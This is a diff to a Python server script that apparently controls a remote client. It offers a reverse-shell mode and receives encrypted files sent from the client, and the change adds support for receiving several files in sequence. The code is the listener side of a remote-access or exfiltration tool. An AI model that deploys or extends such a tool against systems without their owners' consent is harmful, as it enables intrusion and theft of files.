@@ -1,10 +1,12 @@
 # -*- coding: utf-8 -*-
+import os
 import utils
 from socket import socket
 
 host = "127.0.0.1"
 port = 1005
 
+FILE_PATH = "."
 reverse_shell_active = False
 
 sock = socket()
@@ -23,7 +25,11 @@ def print_usage():
     print("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
     print("exit:        Terminate server, client will wait for reconnection")
     print("stop:        Terminate client and server")
-    
+
+def write_file(data:bytes, filename:str, path:str):
+    with open(os.path.join(path, filename), "wb") as file:
+        file.write(data)
+
 while True:
     if reverse_shell_active:
         inpt = input("shell>")
@@ -44,17 +50,24 @@ while True:
             if recv:
                 header = recv.decode(utils.ENCODING).split("__")
 
-                if len(header) == 2: # If len is 2, the header contains a filename. In this case its a file and will be handled as one
-                    filename, chunk_size = header[0], int(header[1])
-                    print("Receiving File:", filename, "chunk_size:", chunk_size)
-
-                    data = b""
-                    for i in range(chunk_size):
-                        recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
-                        if recv:
-                            data += recv
-                    print("Data received")
-                    utils.convert_bytes_to_file(data=data, filename=filename, path=".")
+                if len(header) == 3: # If len is 3, the header contains a filename. In this case its a file and will be handled as one
+                    filename, chunk_size, number_of_files_left = header[0], int(header[1]), int(header[2])
+                    while number_of_files_left > 0:
+                        print("Receiving File:", filename, "chunk_size:", chunk_size)
+                        data = b""
+                        for i in range(chunk_size):
+                            recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
+                            if recv:
+                                data += recv
+                        write_file(data=data, filename=filename, path=FILE_PATH)
+                        number_of_files_left -= 1
+                        print("File received,", number_of_files_left, "files left")
+                        
+                        if number_of_files_left > 0:
+                            recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
+                            if recv:
+                                header = recv.decode(utils.ENCODING).split("__")
+                                filename, chunk_size, number_of_files_left = header[0], int(header[1]), int(header[2])
 
                 elif len(header) == 1: # If len is 1, the header just contains chunk_size and thus will not be converted to a file.
                     chunk_size = int(header[0])
